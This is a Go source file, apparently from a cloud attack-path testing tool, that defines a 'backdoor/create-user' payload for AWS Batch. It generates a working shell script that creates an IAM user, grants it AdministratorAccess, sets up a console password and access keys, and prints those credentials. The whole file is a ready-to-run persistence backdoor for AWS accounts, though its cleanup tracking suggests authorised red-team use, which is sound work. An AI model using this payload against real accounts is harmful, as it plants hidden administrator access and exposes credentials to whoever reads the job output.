// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package batch

import (
	"context"
	"fmt"
	"strings"

	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/iam"
)

// BackdoorCreateUserPayload generates a shell script that creates a new IAM user with
// AdministratorAccess and optional console login / programmatic access keys.
//
// This payload generates a multi-command shell script and requires CONTAINER_RUNTIME=generic
// with an image that has both sh and the AWS CLI installed (e.g. a custom image based on
// amazon/aws-cli or any Linux image with aws-cli-v2).
type BackdoorCreateUserPayload struct{}

func init() {
	_ = payloads.Register(&BackdoorCreateUserPayload{})
}

func (p *BackdoorCreateUserPayload) GetName() string {
	return "backdoor/create-user"
}

func (p *BackdoorCreateUserPayload) GetDescription() string {
	return "Create an IAM user with AdministratorAccess and optional console/programmatic access via Batch job (requires CONTAINER_RUNTIME=generic)"
}

func (p *BackdoorCreateUserPayload) GetTags() []string {
	return []string{
		payloads.TagServiceBatch,
		payloads.TagLanguageBash,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorCreateUserPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "USER_NAME",
			Description: "Name for the backdoor IAM user (auto-generated if empty)",
			Required:    false,
			Default:     "",
		},
		{
			Name:        "CONSOLE_ACCESS",
			Description: "Create a console login profile with a random password (true/false)",
			Required:    false,
			Default:     "true",
		},
		{
			Name:        "ACCESS_KEY",
			Description: "Create programmatic access keys (true/false)",
			Required:    false,
			Default:     "true",
		},
	}
}

func (p *BackdoorCreateUserPayload) Validate(options map[string]string) error {
	return nil
}

// GenerateCode returns a shell script that creates an IAM user with admin access.
// Requires CONTAINER_RUNTIME=generic since it uses multiple shell commands.
func (p *BackdoorCreateUserPayload) GenerateCode(options map[string]string) (string, error) {
	userName := options["USER_NAME"]
	consoleAccess := options["CONSOLE_ACCESS"] != "false"
	accessKey := options["ACCESS_KEY"] != "false"

	userNameSetup := ""
	if userName != "" {
		userNameSetup = fmt.Sprintf(`USER_NAME="%s"`, userName)
	} else {
		userNameSetup = `USER_NAME="pathrunner-admin-$(date +%s)"`
	}

	consoleBlock := ""
	if consoleAccess {
		consoleBlock = `
PASSWORD=$(cat /dev/urandom | tr -dc 'A-Za-z0-9' | head -c 16)
echo "Creating console login profile..."
aws iam create-login-profile \
    --user-name "$USER_NAME" \
    --password "$PASSWORD" \
    --no-password-reset-required 2>&1
if [ $? -eq 0 ]; then
    ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
    echo "Console URL: https://${ACCOUNT_ID}.signin.aws.amazon.com/console"
    echo "Console Username: $USER_NAME"
    echo "Console Password: $PASSWORD"
else
    echo "WARNING: Could not create login profile"
fi
`
	}

	accessKeyBlock := ""
	if accessKey {
		accessKeyBlock = `
echo "Creating access keys..."
KEY_OUTPUT=$(aws iam create-access-key --user-name "$USER_NAME" 2>&1)
if [ $? -eq 0 ]; then
    AK_ID=$(echo "$KEY_OUTPUT" | grep -o '"AccessKeyId": "[^"]*"' | cut -d'"' -f4)
    AK_SECRET=$(echo "$KEY_OUTPUT" | grep -o '"SecretAccessKey": "[^"]*"' | cut -d'"' -f4)
    echo "--- PATHFINDER_IDENTITY_DATA ---"
    echo "NAME=backdoor/$USER_NAME"
    echo "TYPE=keys"
    echo "ACCESS_KEY_ID=$AK_ID"
    echo "SECRET_ACCESS_KEY=$AK_SECRET"
    echo "AUTO_SWITCH=false"
    echo "--- END_PATHFINDER_IDENTITY_DATA ---"
else
    echo "WARNING: Could not create access keys"
fi
`
	}

	script := fmt.Sprintf(`set -e
%s
echo "Creating IAM user: $USER_NAME..."
CREATE_OUTPUT=$(aws iam create-user --user-name "$USER_NAME" 2>&1)
if [ $? -ne 0 ]; then
    echo "FAILED: Could not create user: $CREATE_OUTPUT"
    exit 1
fi
USER_ARN=$(echo "$CREATE_OUTPUT" | grep -o '"Arn": "[^"]*"' | cut -d'"' -f4)
echo "User created: $USER_ARN"

echo "Attaching AdministratorAccess policy..."
aws iam attach-user-policy \
    --user-name "$USER_NAME" \
    --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
if [ $? -ne 0 ]; then
    echo "FAILED: Could not attach policy"
    exit 1
fi
echo "Policy attached successfully"
%s%s
echo "SUCCESS: Backdoor user $USER_NAME created with AdministratorAccess"
`, userNameSetup, consoleBlock, accessKeyBlock)

	return strings.TrimLeft(script, "\n"), nil
}

// VerifySuccess checks that the backdoor user exists.
func (p *BackdoorCreateUserPayload) VerifySuccess(ctx context.Context, config aws.Config, options map[string]string) (bool, error) {
	userName := options["USER_NAME"]
	if userName == "" {
		return false, fmt.Errorf("USER_NAME not set; cannot verify auto-generated username")
	}

	iamClient := iam.NewFromConfig(config)
	_, err := iamClient.GetUser(ctx, &iam.GetUserInput{
		UserName: aws.String(userName),
	})
	if err != nil {
		return false, nil
	}

	return true, nil
}

// ReportSideEffects returns the created user as a tracked resource for cleanup.
func (p *BackdoorCreateUserPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	userName := options["USER_NAME"]
	if userName == "" {
		userName = "pathrunner-admin-<timestamp>"
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:user",
			Name:          userName,
			CleanupMethod: "iam:DeleteUser",
			Metadata: map[string]string{
				"console_access": options["CONSOLE_ACCESS"],
				"access_key":     options["ACCESS_KEY"],
			},
		},
	}
}

// ProcessResult returns a summary of the batch job execution.
func (p *BackdoorCreateUserPayload) ProcessResult(result string) (string, error) {
	return result, nil
}
